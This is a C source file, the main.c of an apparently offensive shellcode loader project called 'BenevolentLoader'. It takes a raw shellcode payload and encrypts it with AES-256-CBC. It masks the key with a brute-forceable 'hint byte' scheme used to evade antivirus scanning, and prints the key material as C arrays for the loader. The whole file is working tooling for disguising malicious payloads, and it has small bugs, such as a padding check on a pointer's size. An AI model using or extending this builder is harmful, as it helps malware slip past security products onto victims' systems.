/*
 *  ~ main.c ~
 * BenevolentLoader payload builder
 * Author: jakobfriedl
 * Date: June 2024
 */ 

#include "base.h"

#define KEYSIZE 32 // 23 * 8 = 256 bits, since AES256 is used
#define IVSIZE 16  // AES-256-CBC uses 16 byte IV

int wmain(int argc, wchar_t* argv[]) {
    
    struct AES_ctx ctx; 

    PBYTE pBaseShellcode = NULL; 
    PBYTE pPaddedShellcode = NULL; 
    PBYTE pEncryptedShellcode = NULL;
    SIZE_T sSize = NULL; 
    SIZE_T sPaddedSize = NULL;
    SIZE_T sEncryptedSize = NULL; 

    PBYTE pOriginalKey = NULL; 
    PBYTE pProtectedKey = NULL; 
    PBYTE pIv = NULL; 
    BYTE bHintByte = NULL; 

    // Open base payload.bin file (unencrypted) 
    if (!ReadFromFile(&pBaseShellcode, &sSize)) {
        PRINT_ERROR("ReadFromFile"); 
        return EXIT_FAILURE; 
    }
    PrintByteArray(pBaseShellcode, sSize); 

    /// Generate random encryption key
    PRINTA("[~~~] Generating and protecting encryption key...\n");
    GenerateProtectedKey(KEYSIZE, &bHintByte, &pOriginalKey, &pProtectedKey); 

    OKAY("Hint byte: 0x%0.2X", bHintByte); 

    OKAY("[ 0x%p ] Original key:", pOriginalKey); 
    PrintByteArray(pOriginalKey, KEYSIZE); 

    OKAY("[ 0x%p ] Protected key:", pProtectedKey); 
    PrintByteArray(pProtectedKey, KEYSIZE); 

    /// Generate random IV
    PRINTA("[~~~] Generating IV...\n");
    GenerateRandomBytes(&pIv, IVSIZE); 
    OKAY("[ 0x%p ] IV:", pIv); 
    PrintByteArray(pIv, IVSIZE); 

    /// Encrypt payload 
    // Initialize Tiny-AES libary
    AES_init_ctx_iv(&ctx, pOriginalKey, pIv); 

    // Padding, if necessary
    if (sizeof(pBaseShellcode) % 16 != 0) {
        PaddBuffer(pBaseShellcode, sSize, &pPaddedShellcode, &sPaddedSize); 
        // Encrypt padded buffer
        AES_CBC_encrypt_buffer(&ctx, pPaddedShellcode, sPaddedSize); 
        pEncryptedShellcode = pPaddedShellcode; 
        sEncryptedSize = sPaddedSize; 
    }
    else { // No padding required
        AES_CBC_encrypt_buffer(&ctx, pBaseShellcode, sSize); 
        pEncryptedShellcode = pBaseShellcode; 
        sEncryptedSize = sSize; 
    }

    OKAY("[ 0x%p ] Encrypted shellcode.", pEncryptedShellcode); 
    PrintByteArray(pEncryptedShellcode, sEncryptedSize); 

    // Write encrypted payload to enc.bin
    if (!WriteToFile(pEncryptedShellcode, sEncryptedSize)) {
        PRINT_ERROR("WriteToFile"); 
        return EXIT_FAILURE; 
    }

    // Output for copying to the loader
    PRINTA("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n"); 

    PRINTA("#define HINT_BYTE 0x%0.2X\n", bHintByte); 
    ByteArrayToC("pProtectedKey", pProtectedKey, KEYSIZE); 
    ByteArrayToC("pIv", pIv, IVSIZE); 
    
    return EXIT_SUCCESS; 
}